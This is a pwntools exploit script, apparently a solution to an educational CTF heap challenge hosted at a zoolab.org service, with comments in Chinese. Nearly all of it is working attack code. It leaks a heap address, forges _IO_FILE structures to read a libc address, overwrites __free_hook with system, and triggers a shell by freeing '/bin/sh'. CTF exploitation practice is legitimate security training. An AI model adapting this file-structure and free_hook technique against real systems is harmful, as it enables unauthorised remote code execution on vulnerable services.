from pwn import *
context.arch='amd64'
context.terminal=['tmux','splitw','-h']
# r=process("./chal")
r=remote("edu-ctf.zoolab.org",10011)
# gdb.attach(r)
def add(idx,name):
    r.recvuntil('5. bye\n> ')
    r.sendline(b'1')
    r.recvuntil('index\n> ')
    r.sendline(str(idx))
    r.recvuntil('username\n> ')
    r.sendline(name)
    r.recvuntil('success!\n')

def edit(idx,size,data):
    r.recvuntil('5. bye\n> ')
    r.sendline(b'2')
    r.recvuntil('index\n> ')
    r.sendline(str(idx))
    r.recvuntil('size\n> ')
    r.sendline(str(size))
    r.sendline(data)
    r.recvuntil('success!\n')



def delete(idx):
    r.recvuntil('5. bye\n> ')
    r.sendline(b'3')
    r.recvuntil('index\n> ')
    r.sendline(str(idx))
    r.recvuntil('success!\n')

def show():
    r.recvuntil('5. bye\n> ')
    r.sendline(b'4')
#洩漏fd address
add(0,b'A'*8)
add(1,b'B'*8)
add(2,b'C'*8)   
edit(1,0x20,'A')
delete(0)
delete(1)
show()

r.recvuntil('[1] ')
chunk_address = u64(r.recv(6).ljust(8, b'\x00'))##得到某一個chunk_address
# print(hex(chunk_address))
file_address=chunk_address+0x90 # file的address fd
file_table=file_address+0xd8 # file_table

#實現任意讀
edit(2,0x20,'A')
delete(2)
r.recvuntil('5. bye\n> ')
r.sendline('2')
r.recvuntil('index\n> ')
r.sendline(str(2))
r.recvuntil('size\n> ')
r.sendline(str(0x1d8))
# r.sendline('A'*5)
print('file_address',hex(file_address))
print('file_table',hex(file_table))
FileStructure=flat(
    0xfbad0800,
    0,# _IO_read_ptr
    file_table, #read end
    0,# _IO_read_base 
    file_table, # write base
    file_table+8, # write_ptr
    0 #write_end
)
FileStructure+=b"\x00"*0x38
FileStructure+=p64(1) #資料印到stdout
r.sendline(FileStructure)
libc=u64(r.recv(6).ljust(8, b'\x00'))-0x1e94a0
print(hex(libc))

#實現任意寫
add(2,b'C'*8)    # 覆蓋錯誤的FD
add(1,b'C'*8)    
edit(2,0x20,'A') 
delete(2)


free_hook = libc + 0x1eee48
system = libc + 0x52290

FileStructure=flat(
    0xfbad0800, # _flags   0xfbad0000| 800
    0,# _IO_read_ptr
    0, #  _IO_read_end
    0,# _IO_read_base 
    free_hook, #  _IO_write_base
    0, #  _IO_write_ptr
    0, #  _IO_write_end
    free_hook, #  _IO_buf_base
    free_hook + 8 + 0x200, # _IO_buf_end
)
FileStructure+=b"\x00"*0x28
FileStructure+=p64(0)
print(hex(free_hook))
edit(2,0x1d8, FileStructure) #malloc, fwrite
show()  # fread
r.sendline(p64(system).ljust(8+0x200,b'\x00'))
add(3,b'/bin/sh\x00')

r.interactive() 